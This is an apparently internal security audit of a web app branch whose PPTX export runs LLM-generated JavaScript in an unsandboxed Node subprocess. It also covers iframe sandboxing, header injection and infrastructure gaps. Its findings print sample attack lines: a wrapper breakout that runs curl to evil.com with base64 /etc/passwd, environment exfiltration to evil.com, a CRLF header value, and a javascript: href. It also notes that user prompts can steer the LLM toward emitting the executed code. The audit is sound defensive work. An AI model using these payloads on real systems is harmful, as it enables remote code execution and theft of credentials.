# Phase B Audit — §3.8 Artifacts & §B8

Branch: `infra-agent-integration`
Scope: server-side PPTX export, preview iframes, client/server artifact path, related infra.
Method: read-only audit. file:line for every issue. NO FIXING.

The PPTX-export path is the highest-risk addition this branch ships: an authenticated user can cause the backend to **execute arbitrary JavaScript** (sourced from an LLM that itself takes user-controlled prompts) in a Node subprocess with no sandbox, no memory cap, no CPU cap, and only a 30 s timeout. The remainder of the section adds defence-in-depth regressions on top (iframe sandbox weakening, free-form `dict` request body, HTTP response splitting, no rate-limit, dead client-side export still wired to the message stream).

---

## CRITICAL

### C-1. Server-side RCE via LLM-generated JS — `backend/app/services/pptx_export.py:95-160`
The Node script template at `pptx_export.py:95-151` concatenates `func_code` (LLM output) into a Node program that is then `subprocess.run(["node", js_file], …)` at line 157-160. `func_code` is never validated as syntactically a function body; the script template only relies on the LLM keeping `function generatePresentation` somewhere in the text. The "sanitize" pass at lines 53-71 only:
- Strips `#` from `color: "#…"` (cosmetic),
- Truncates 8-char hex → 6-char (cosmetic),
- Flips negative `offset:` values (cosmetic),
- Comments out lines containing `.line.` (very narrow shape-property workaround),
- Rewrites `pres.writeFile(…)` / `pres.save(…)` to `return pres.write("nodebuffer")`.

**None of those checks reduce the attack surface.** An attacker who can influence what Agent 3 emits (any pipeline user) can trivially break out of the wrapper:

1. **Body breakout in the wrap-in-function branch (`pptx_export.py:86-88`)** — if no `function generatePresentation` is found, the entire LLM output is dropped inside `async function generatePresentation() { …LLM… }`. LLM emits `};\nrequire("child_process").execSync("curl evil.com/$(cat /etc/passwd | base64)");\nasync function generatePresentation(){` and the closing `}` from the wrapper now lands at top level — file system reads, network egress, all available.
2. **No-wrap branch** — the LLM emits `function generatePresentation(){…}` then trailing statements after the closing brace; the Python wrapper at lines 109-124 just runs whatever follows in the same Node global scope. No `'use strict'`, no `eval` containment, no `vm.runInNewContext`.
3. **The `Module._resolveFilename` hijack at lines 98-102** — even an inadvertent `require("pptxgenjs")` was the only `require` they wanted to allow, but the override returns to the original `_orig` resolver for everything else (`fs`, `child_process`, `https`, …). All of Node's built-ins remain reachable.

Hard upgrade path is `vm.runInContext` with restricted globals or running Node in a separate uid-namespaced sandbox; nothing in the current template does this.

### C-2. Endpoint accepts free-form `dict`, no Pydantic — `backend/app/api/workflows.py:128-130`
`def export_pptx(request: dict, …)` — `request: dict` bypasses Pydantic entirely. There is no type, size, or shape validation on any field (`js_code`, `html`, `workflow_id`, `title`). Combined with C-1, this means there is no defence-in-depth boundary between the HTTP request body and the JS that gets concatenated into the Node script.

### C-3. No size cap on `js_code` / `html` — `backend/app/api/workflows.py:147-150`
Both are read directly from the dict. The only upstream cap is nginx `client_max_body_size 1m` at `infra/scripts/bootstrap-ec2.sh:579`, which is 1 048 576 bytes — large enough to be operationally significant (1 MB of JS source pumped into the Node process). Per-field caps are absent.

### C-4. No rate-limit on the Node-subprocess endpoint — nginx + backend
nginx caps `/api/` at `120r/m` per IP (`bootstrap-ec2.sh:517`). A single authenticated browser session can hit `/api/workflows/export-pptx` 120 times/minute, spawning 120 concurrent Node processes (the route has no concurrency guard). At ~30 s timeout each and ~200 MB heap default (Node defaults to ~1.5-2 GB), this saturates the m6i.2xlarge (32 GB RAM) and the backend container's 8 GB cgroup ceiling (`docker-compose.yml:108-112`) within seconds. The backend OOM-kill cascades to the FastAPI worker, breaking every other request.

### C-5. No memory / CPU / fd / network limit on the Node subprocess — `pptx_export.py:157-160`
`subprocess.run(["node", js_file], …, timeout=30, cwd=temp_dir)` sets only `timeout`. Specifically missing:
- `node --max-old-space-size=…` heap cap.
- `prlimit` / `setrlimit` wrapper for RSS, CPU, NPROC, NOFILE, FSIZE.
- Network namespace isolation — the Node process can reach `169.254.169.254` (IMDS) and any internet destination the container's egress allows. Combined with IMDSv2 `http_put_response_hop_limit = 2` (`infra/modules/compute/main.tf:98`) and the EC2 instance role, the Node child can fetch instance-role credentials and exfiltrate Bedrock / S3 / KMS scope.

### C-6. Node subprocess inherits the backend's environment — `pptx_export.py:157-160`
No `env=` argument to `subprocess.run`, so the child Node process inherits **every environment variable** of the FastAPI process: `DATABASE_URL`, `SECRET_KEY`, `LANGSMITH_API_KEY`, `BEDROCK_*`, `AWS_*` (if any are exported by `/etc/flowin/app.env` per `flowin-load-secrets`, see `bootstrap-ec2.sh:469-503`). LLM-generated JS executing `console.log(process.env)` or `require("https").request("https://evil.com", …)` exfiltrates the lot. A reasonable hardening is `env={"PATH": "/usr/local/bin:/usr/bin", "PPTX_NODE_MODULES_DIR": …}`.

### C-7. Iframe sandbox effectively disabled by `allow-scripts allow-same-origin` — `frontend/src/components/preview/PPTPreview.tsx:162`, `frontend/src/components/preview/PrototypePreview.tsx:105`
Per the HTML spec and MDN: when a sandboxed iframe has BOTH `allow-scripts` and `allow-same-origin`, the iframe can use scripts to remove its own `sandbox` attribute (via `parent.document.querySelector("iframe").removeAttribute("sandbox")`) and is otherwise treated as same-origin with the embedder. The PPT and Prototype iframes use `srcDoc` containing LLM-emitted HTML/JS; that HTML can therefore:
- Read `localStorage` / `sessionStorage` (the JWT token from `getToken()` lives here, see `frontend/src/lib/api.ts`),
- Issue `fetch("/api/…")` with the user's cookie/Authorization,
- Mutate the parent DOM (the embedder enables `allow-same-origin`, so this is unrestricted from inside `srcDoc`).

The regression is that the old preview shipped with `allow-downloads allow-popups` and presumably without `allow-same-origin`; the new code dropped both download/popups and *added* `allow-same-origin`. The lost permissions never gave attackers anything; the new one gives away everything.

---

## HIGH

### H-1. `agent_outputs` substring match catches false positives — `backend/app/api/workflows.py:163`
```python
if "code" in aid or "generator" in aid or "ppt-code" in aid:
```
`aid` is an agent ID string. `code` matches `app-code-generator`, `code-reviewer`, `barcode-extractor`, etc.; `generator` matches `prototype-generator`, `app-builder-code-generator`, etc. When a user has both a PPT workflow AND an App Builder workflow run in their account, the substring match picks the first agent that contains `code` OR `generator` OR `ppt-code` — which can be `app-code-generator` (App Builder) rather than `ppt-code-generator` (PPT). That output is then fed into the Node subprocess as if it were PPTX JS. Best case: Node errors and the user sees "PPTX generation failed". Worst case: the App Builder agent emitted something that happens to define a `generatePresentation` function (template-y code) and the resulting `.pptx` is gibberish but completes successfully.

### H-2. Workflow ID is not UUID-validated — `backend/app/api/workflows.py:149,153-157`
`workflow_id` is read from the request `dict` as a free string. The DB column `id` is `String` (`backend/app/models/workflow.py: id = Column(String, primary_key=True, default=…uuid4())`) but it's not constrained to UUID format. An attacker can pass `workflow_id = ""` (already handled by the `if not js_code and workflow_id` guard) but **also any string** — including SQL wildcards (`'%'`, `'_'`). Because the query uses SQLAlchemy `==`, this isn't an injection per se, but the `==` allows the DB to do an index scan with the literal string, which is harmless. The real risk: with no UUID enforcement, malformed `workflow_id` values flow through to the DB query that scopes by `user_id == current_user.id` — so an attacker can't read other users' workflows, but the missing validation reflects the absence of an input-sanitization discipline at this surface.

### H-3. HTTP-response-splitting risk in `Content-Disposition` filename — `backend/app/api/workflows.py:222-226`
```python
filename = f"{title.replace(' ', '_')[:40]}.pptx"
return Response(headers={"Content-Disposition": f'attachment; filename="{filename}"'})
```
`title` is user-controlled (free string in the request dict). The only normalization is `replace(' ', '_')` and `[:40]`. A title of `evil\r\nSet-Cookie: pwn=1` is not blocked. **However**, Starlette's `Response` constructor pipes headers through `MutableHeaders` which normalizes `\n` and `\r` to safe values when shipping over ASGI — so this is realistically a defence-in-depth gap, not exploitable today. Still worth flagging: the response of trusting user input here is "we got lucky the framework sanitizes it; don't rely on that".

A more immediate problem: `"` characters in `title` break the quoted-string. `title = 'foo".pptx; filename="bar'` produces `Content-Disposition: attachment; filename="foo".pptx; filename="bar.pptx"`. Browsers will pick the second token. Path-traversal characters (`../`) inside the filename are NOT stripped; the filename `..%2F..%2Fpwn.pptx` is preserved verbatim. Most browsers strip `../` themselves on save, but again — defence-in-depth.

### H-4. Stack trace / file paths leak in error response — `backend/app/api/workflows.py:217-220` and `pptx_export.py:163-165`
```python
raise HTTPException(
    status_code=500,
    detail=f"Failed to generate PPTX: {str(e)[:200]}",
)
```
The wrapped exception originates at `pptx_export.py:165`: `raise RuntimeError(f"PPTX generation failed: {err}")` where `err = result.stderr.strip()[:300]`. Node's `stderr` contains:
- Stack traces with absolute file paths (`/tmp/pptx_export_AbCdEf/input.js:42:11`),
- The pptxgenjs install path (`/opt/pptx/node_modules/pptxgenjs/…`),
- Sometimes environment / version banner (Node version).

200 chars truncates aggressively, but the leading `/tmp/pptx_export_…` prefix + a short error name is plenty to fingerprint the runtime and confirm the Node-subprocess attack surface from an unauthenticated probe (after login).

### H-5. Temp-file cleanup is best-effort on the failure path — `pptx_export.py:173-179`
```python
finally:
    try:
        if os.path.exists(js_file): os.unlink(js_file)
        if os.path.exists(out_file): os.unlink(out_file)
        os.rmdir(temp_dir)
    except Exception:
        pass
```
The `temp_dir` (via `tempfile.mkdtemp(prefix="pptx_export_")`) under `/tmp` is owned by the flowin user. The cleanup:
- Catches any exception and silently passes — a `PermissionError` (if the Node subprocess created a sub-file owned by a different uid, which it can't here, but illustrates the pattern) leaves the temp dir behind.
- Does NOT use `tempfile.TemporaryDirectory` context manager which would walk the tree.
- Does NOT clean up additional files the Node subprocess might create (e.g. an LLM that emits `fs.writeFileSync("/tmp/extra.bin", …)` for image data) — those persist.
- Container `/tmp` is on the root EBS volume (100 GB, `infra/envs/prod/variables.tf`), shared with system logs, Docker layer cache, etc. A coordinated leak attacker can fill `/tmp` faster than the alarms threshold (80% root-disk alarm in `infra/modules/monitoring/main.tf:414-437`) reaches the on-call.

### H-6. PPTX response body buffered in memory, not streamed — `workflows.py:215, 222-227`
```python
pptx_bytes = generate_pptx_from_code(js_code, title=title)
…
return Response(content=pptx_bytes, …)
```
A 50-slide deck with embedded images can be 30-50 MB. Holding the full bytes in the backend Python process **and** the FastAPI response buffer **and** then serializing to the ASGI/uvicorn response is ~3× memory amplification. Combined with concurrent requests (C-4), this is the path to OOM on the m6i.2xlarge.

### H-7. ArtifactCard download is dead/redundant + misleading — `frontend/src/components/chat/ArtifactCard.tsx:76-103`
`handleDownload` uses `parsePPTSlideData(content)` + `exportToPptx(slideData, …)` — the client-side `pptxgenjs` path (`frontend/src/lib/exporters/pptExporter.ts`). This produces a different artifact (a generic deck from the parsed JSON) than the server-side path through `/api/workflows/export-pptx`. Both are wired:
- ArtifactCard → client-side (PPT card under the chat message, `dashboard/page.tsx:162-185`).
- FilesTab and PPTPreview → server-side (`FilesTab.tsx:135-175`, `PPTPreview.tsx:53-83`).

A user who downloads from the chat message gets a stripped, parser-derived deck; the same workflow downloaded from the Files tab gives the LLM-emitted Agent 3 deck. **Two different outputs for "the same artifact"** — a usability bug that hides the actual document. Phase A's claim that ArtifactCard is "dead code" is wrong: it is wired, but it produces a non-canonical version.

### H-8. Title-based workflow disambiguation is fragile — `frontend/src/components/preview/PPTPreview.tsx:43-50` and `FilesTab.tsx:151-157`
Both client-side download flows pick the workflow via:
```ts
const match = runs.find((r) => r.output?.includes(h1[1]));
…
if (!workflowId && runs.length > 0) workflowId = runs[0].id;
```
- "first workflow with the H1 text in its output" — if two PPT workflows produce decks with the same H1, the older one wins.
- The fallback `runs[0].id` is "the most recently created PPT run" — which is wrong when the user has multiple browser tabs open with stale decks.
- The user is never told which workflow was matched.

### H-9. PPT export endpoint also accepts raw HTML and re-parses out the JS — `workflows.py:170-206`
The HTML-extraction fallback regex-scans for `function generatePresentation(...) { … }` in arbitrary HTML uploaded as the `html` field. This means a user can POST 1 MB of HTML containing arbitrary JS at the script tag boundary, and the backend extracts and executes it. No content-type / size enforcement other than nginx 1 MB. This is a second RCE entry that bypasses any defence on `js_code` (e.g. if someone later adds a `js_code` cap, the HTML lane still wide open).

---

## MEDIUM

### M-1. Phase A's "PPT revision pipeline has 2 agents" finding is correct; the other revision pipelines have 1 — `backend/app/agents/registry.py:314, 389, 447, 496`
- `PPT_REVISION_AGENTS`: 2 agents (revision-agent + assembler).
- `USER_STORY_REVISION_AGENTS`: 1 agent.
- `PROTOTYPE_REVISION_AGENTS`: 1 agent.
- `APP_BUILDER_REVISION_AGENTS`: 1 agent.

Phase A claimed "2 agents each" — incorrect for everything except PPT. Worth correcting in the Phase A audit doc; not a defect.

### M-2. `parsePPTSlideData` runs on untrusted LLM output before the client-side exporter — `frontend/src/components/chat/ArtifactCard.tsx:81`
`parsePPTSlideData` is called inside the `try { … } catch` in `handleDownload`. If the parser throws on malformed JSON, the user sees `console.error("Failed to download artifact:", err)` and nothing happens — silent failure. No UI feedback for the user.

### M-3. `iframeKey` is a frozen `useState(0)` — `PPTPreview.tsx:18`, `PrototypePreview.tsx:17`
```ts
const [iframeKey] = useState(0);
```
The setter is destructured-discarded and `iframeKey` is initialized once, then never changed. The intent was clearly "re-mount the iframe by changing the key" but the code only ever uses `0`. Effectively the `key` prop is a no-op. Cosmetic dead-state.

### M-4. `htmlContent` modifications happen during render, not in `useMemo` — `PPTPreview.tsx:111-130`
Every render re-runs the regex replacements and string concatenation on the (potentially large) HTML. Combined with `srcDoc={htmlContent}`, the iframe's source attribute changes on every render, forcing a full reload of the iframe contents. This is performance pollution but also explains why the iframe constantly flickers in production (per docs/WORKFLOWS.md anecdotes about preview UX issues).

### M-5. Bash-escape risk in revision text routed to the LLM, not the iframe — `PPTPreview.tsx:191-211`
`revisionText` is just sent to `onRevise(revisionText.trim())` which goes back over WebSocket to start a `_revision` pipeline (the agent prompt gets the user's text as a normal LLM message). No direct XSS, but the value is later concatenated into agent prompts in the registry — if a Bedrock prompt-injection vector lives here, the user-controlled text flows to a chain that produces JS that this backend executes (Issue C-1).

### M-6. PPTX MIME type matches Office expectations; no magic-byte check — `workflows.py:225`
Backend hands back `application/vnd.openxmlformats-officedocument.presentationml.presentation` regardless of what bytes Node actually wrote. If the LLM-emitted JS causes pptxgenjs to write an HTML error page or anything non-zip-archive into `out_file`, the user downloads a malformed `.pptx`. Not a security issue, but a robustness gap; the response should validate at least the ZIP magic bytes (`PK\x03\x04`).

### M-7. Failure of `_FallbackPptx` inside the Node script silently hides the real error — `pptx_export.py:109-124`
```js
const _OrigFunc = generatePresentation;
generatePresentation = async function() {{
  try { … } catch(e) {
    console.error("Crashed:", e.message, "- creating fallback");
    const p = new _FallbackPptx(); …
    s.addText("Export error: " + e.message, …);
    return await p.write("nodebuffer");
  }
};
```
A "successful" export with the fallback path returns a deck that says "Export error: <e.message>" — but the HTTP response is still 200 OK, the bytes are still a valid pptx, and the frontend can't tell. The user sees a one-slide deck and assumes the system worked. Worse: `e.message` is the LLM error and gets baked into the deck text — could leak file paths.

### M-8. Markdown preview escapes via `dangerouslySetInnerHTML` — `UserStoryPreview.tsx:217-225`
`dangerouslySetInnerHTML={{ __html: criterion.replace(…) }}` — but `criterion` is from the parser, which itself is from user/LLM markdown. The replace chain rewrites `**Given**` etc. into `<span class="…">Given</span>` and then injects raw HTML. If the LLM emits acceptance criteria containing `<script>` or `<img onerror=…>`, those get rendered with browser interpretation. The `react-markdown` path elsewhere is safe, but this hand-rolled HTML injection bypasses it.

### M-9. Markdown preview ReactMarkdown allows `target="_blank"` but no `rel="noopener noreferrer"` audit on user-provided URLs — `MarkdownPreview.tsx:114-116`
```tsx
<a href={href} target="_blank" rel="noopener noreferrer" className="…">
```
Good — `rel="noopener noreferrer"` is set. But `href={href}` is unvalidated; `href = "javascript:fetch('/api/auth/me').then(…)"` is rendered. React 18+ logs a warning for `javascript:` href but does NOT block the navigation in all browsers. Defence-in-depth gap.

### M-10. Inline-style `style={{ background: "..." }}` in multiple components — harmless but worth noting
Several preview components inline `style={{ background: "#…" }}` (`FilesTab.tsx:197`, `PrototypePreview.tsx:74`). CSP `style-src 'self' 'unsafe-inline'` (bootstrap-ec2.sh:602) already allows it — but a tightening of CSP would break these.

### M-11. `tempfile.mkdtemp` returns a world-readable directory by default — `pptx_export.py:90`
`mkdtemp` creates the directory with `mode=0o700` (Python defaults). That's safe on the owner side. But the `js_file` and `out_file` written inside it are created with the process's umask, which in a typical container is `0o022` → world-readable. If another process is running in the same container (it isn't, but supply-chain attacks could land one), it can read the in-flight LLM-generated JS. Minor.

### M-12. `frontend/src/lib/exporters/pptExporter.ts` writes the file via `pres.writeFile(...)` from the browser — `pptExporter.ts:109`
This works because browser pptxgenjs has a polyfill for `writeFile` (triggers a download). On Node it crashes — hence the rewrite at `pptx_export.py:74-80`. The two paths produce different files, see H-7.

---

## LOW

### L-1. The `replace_all` regex set assumes pptxgenjs hex colours are upper-case — `pptx_export.py:54-57`
`[0-9A-Fa-f]{6}` is case-insensitive (good), but the lambda at line 57 uses `m.group(1)[:6]` — only operates on uppercase-name match (regex is case-insensitive). Fine functionally; a code-review nit.

### L-2. `func_code.replace('return return', 'return')` is a hack on top of a hack — `pptx_export.py:80`
If both the `pres.writeFile(...)` rewrite and the user's code already had `return pres.writeFile(…)`, the result is `return return pres.write("nodebuffer")` which is then `replace`'d to `return pres.write("nodebuffer")`. That's correct in this narrow case but the layering suggests the regex was discovered to break things and patched ad-hoc rather than re-thought.

### L-3. `pptxgenjs 3.12.0` pinned via `frontend/package.json` and Dockerfile — `backend/Dockerfile:97`, `frontend/package.json:14`
The latest pptxgenjs release line at the time of writing is 3.12.x (as per the lockfile entry). 3.12.0 has no known CVEs in the public databases I have access to, but the version was released early 2024 — no point checking for newer minor versions without a network probe, but the pin is stale-friendly. `^3.12.0` in `package.json` allows minor/patch upgrades on `npm install`, but the Dockerfile pins exactly `pptxgenjs@3.12.0`, so the runtime is reproducible.

### L-4. `pptxgenjs` ships a JSZip 3.10.1 transitive — `frontend/package-lock.json:7910`
JSZip 3.10.1 has CVE-2022-48285 fixed (prototype pollution in older versions); 3.10.1 is post-fix. Safe.

### L-5. Image size grew 453 MB → 591 MB — `backend/Dockerfile:91-97`
Pptx-builder stage installs Node 20 + pptxgenjs into /opt/pptx, plus the runtime stage copies in the Node binary at line 136. Net ~138 MB additional layer. Storage: ECR scanning costs ~$0.10/GB/month per repository — for a 590 MB image with 30-50 versions retained, that's ~$3/month extra. EC2 pull time on cold restart: ~30 s on m6i.2xlarge networking, adds to RTO. Reasonable trade-off given the use-case, but documented nowhere; an operator considering whether to keep this path is missing the cost signal.

### L-6. `FilesTab.handleDownloadAll` cascades downloads with `setTimeout(…, i*150)` — `FilesTab.tsx:182`
Setting 150 ms between downloads means a 10-file user gets 1.5 s of cascading download prompts. For PPTX-server-side downloads, this also kicks off `N` concurrent backend export requests with no co-ordination. Not catastrophic, but multiplies issue C-4 for the legitimate user.

### L-7. PPTPreview HTML manipulation strips download buttons baked into the LLM output — `PPTPreview.tsx:117-119`
Regex strips `<button class="dl-btn">`, `<button onclick="generatePresentation()">`, and any `<button>` containing "download pptx" or "export pptx". The LLM is *expected* to bake these in (because Agent 3's prompt likely instructs it to). Brittle: any change in the LLM's button class or text breaks the cleanup, and the user sees duplicate "Download PPTX" buttons. Cosmetic.

### L-8. `FilesTab.formatSize` uses 1024/1048576, not SI 1000 — `FilesTab.tsx:246-250`
Mislabelled "KB" / "MB" should be "KiB" / "MiB" if you're using binary. Cosmetic.

### L-9. PPT preview "Open in new tab" creates a Blob URL but only revokes after 5 s — `PPTPreview.tsx:146-151`, `PrototypePreview.tsx:66-71`
```ts
setTimeout(() => URL.revokeObjectURL(url), 5000);
```
If the new tab takes longer than 5 s to load the blob, it gets a "page not found" error. If the user closes the tab before 5 s, the blob URL leaks. Minor robustness issue.

---

## TF concerns

### TF-1. CloudWatch disk-alarm threshold (80%) is unchanged but the workload changed — `infra/modules/monitoring/variables.tf` (default 80%) and `infra/modules/monitoring/main.tf:414-463`
The new Node-subprocess path writes to `/tmp` on the root EBS (100 GB, `prod/variables.tf:root_volume_size_gb = 100`). Existing disk alarm threshold 80% = 80 GB used before paging. Combined with H-5 (best-effort cleanup) and C-3/C-4 (no caps on JS size or concurrency), a coordinated attacker can fill 20 GB very fast — the alarm period is 300 s evaluation_periods=2 = up to 10 min before paging. The right tuning would either:
- Pull `/tmp` onto a separate `tmpfs` (RAM-backed, with its own size cap) at the systemd level, OR
- Tighten the disk alarm threshold to ~65% for the root volume only, leaving the data volume at 80% (which is Postgres's growth-driven path).

### TF-2. No CloudWatch alarm on the Node-subprocess process count or duration — `infra/modules/monitoring/main.tf` (whole file)
The new attack surface ships without observability. There's no:
- Custom metric for "node subprocess started",
- Custom metric for "node subprocess timed out",
- Log filter on `pptx_export.py:164 'Node.js PPTX generation failed'` (the only log line that fires on failure).

Result: a sustained attack that just OOMs the box via Node memory pressure (C-5) appears as the existing `mem_high` alarm (`monitoring/main.tf:389-411`). On-call has to infer the cause from container logs.

### TF-3. Docker compose backend memory limit 8G is **per-container**, not per-Node-subprocess — `docker-compose.yml:108-112`
```yaml
deploy:
  resources:
    limits:
      memory: 8G
```
This caps the FastAPI container's total RSS at 8 GB. The Node subprocesses are children of that container's cgroup, so they share the 8 GB. With C-4/C-5, ~5 concurrent Node procs at 1.5 GB each saturates the cap, the cgroup OOM-killer fires, and uvicorn dies. There is no separate limit "Node subprocesses get at most 256 MB each" — that has to be set at the `subprocess.run` level (`--max-old-space-size`) and isn't.

### TF-4. Bootstrap does not clean `/tmp` on container restart — `infra/scripts/bootstrap-ec2.sh` (whole file)
`/tmp/pptx_export_*` directories from a previous container's run survive a `docker compose restart` (because `/tmp` is on the host's `/`, not on the container's tmpfs). The cleanup in `pptx_export.py:173-179` only happens on the normal success/failure path, not on a SIGKILL'd container. So `/tmp/pptx_export_xxxxx` accumulates over reboots until manual cleanup. No `tmpwatch` / `tmpreaper` / systemd-tmpfiles age-based purge is installed by bootstrap. Operationally this is the same hazard as TF-1 but slower.

### TF-5. Pptx-builder runs `npm install --omit=dev pptxgenjs@3.12.0` once per Docker build — `backend/Dockerfile:97`
No `npm audit` step, no `npm ci`, no lockfile. `pptxgenjs` has 4 transitive deps (`@types/node`, `https`, `image-size`, `jszip`); a future supply-chain attack on any of those would land in the runtime image silently. Locking would require either: (a) bringing the frontend `package-lock.json` into the build context (not currently — see `# Note on requirements.txt` in Dockerfile, similar discipline missing here), or (b) a dedicated `pptx/package-lock.json` checked in.

### TF-6. Instance type `m6i.2xlarge` (8 vCPU, 32 GB) is comfortable for the original Python + Postgres workload but doesn't account for Node-subprocess fan-out — `infra/envs/prod/variables.tf:1-5`
At 8 vCPU and the C-4 concurrency profile, a CPU-bound LLM-emitted JS infinite-loop (`while(true){}` inside `generatePresentation`) pinned for 30 s before timeout consumes one full core. Five such requests in parallel saturate 5 cores and starve the FastAPI event loop. No CPU alarm fires until `cpu_threshold_percent = 80%` for 15 min (`monitoring/main.tf:364-386, variables.tf default`) — so 30 s of pinning isn't visible.

### TF-7. CloudWatch `disk_root_high` is fine — the alarm is correct in form — `monitoring/main.tf:414-437`
treat_missing_data = "breaching" is intentional and well-commented (dead CW agent fires the alarm).

### TF-8. PPTX_NODE_MODULES_DIR env var is set in production-Docker-only — `pptx_export.py:28-37`
The path resolution at module-load time has a side-effect: if the env var is set to a non-existent path, the module still tries to use it (no `.exists()` check on the env-var branch — only the `/opt/pptx/node_modules` default has the exists check). A misconfigured `PPTX_NODE_MODULES_DIR=/non/existent` results in every export failing with "Cannot find module 'pptxgenjs'" — diagnosable but ugly. Test coverage exists at `backend/tests/unit/test_pptx_export_path_resolution.py` for the resolution rules but not for the misconfig case.

### TF-9. Container is non-root (UID 10001) — does NOT mitigate the RCE — `backend/Dockerfile:140, 167`
`USER 10001:10001` is good hygiene, but the Node subprocess runs as the *same* UID. The flowin user inside the container can read:
- `/app/skills/*` — per-user agent state (other users' skill definitions, possibly sensitive),
- `/etc/flowin/app.env` — secrets file, mode 0640 owned root:flowin (readable by group flowin, which is 10001).

So the RCE can exfiltrate every secret the backend process itself has access to. Non-root is a control on *privilege* (no root-only syscalls, no /etc writes) but not on *data*.

### TF-10. ECR storage cost of larger image — `backend/Dockerfile` (whole file)
Per L-5, the image grew 138 MB. ECR has IMMUTABLE tagging enabled (commented elsewhere in the deploy doc); 30-50 versioned tags retained at ~600 MB each = ~25 GB. ~$2.50/month extra. Not material, just visibility.

---

## Concise note on prior-doc errors found

- "ArtifactCard.handleDownload uses legacy client-side path (dead code)" — **wrong**; it is live but produces a different artifact than the FilesTab/PPTPreview server-side path (H-7).
- "New `*_REVISION_AGENTS` with 2 agents each" — **partial**; only PPT_REVISION_AGENTS has 2; the others have 1 (M-1).
- "Only 30s timeout" — **correct** but understated; the bigger problem is the absence of memory/CPU/network caps (C-5).
- "Substring matching `code/generator/ppt-code` catches `app-code-generator`" — **correct** (H-1), and worth adding `barcode-extractor` / `prototype-generator` to the list of likely false-positive matches.

---

## Summary count

- CRITICAL: 7
- HIGH: 9
- MEDIUM: 12
- LOW: 9
- TF concerns: 10

The CRITICAL count is explicitly RCE-cluster: C-1 is the primary vulnerability; C-2 through C-6 are missing defence-in-depth controls that would each independently make C-1 less catastrophic; C-7 is the frontend mirror (similar trust failure, different attacker, same root cause: untrusted output rendered in a same-origin context). The remaining HIGH/MEDIUM findings are the operational and UX gaps surrounding the same code path.
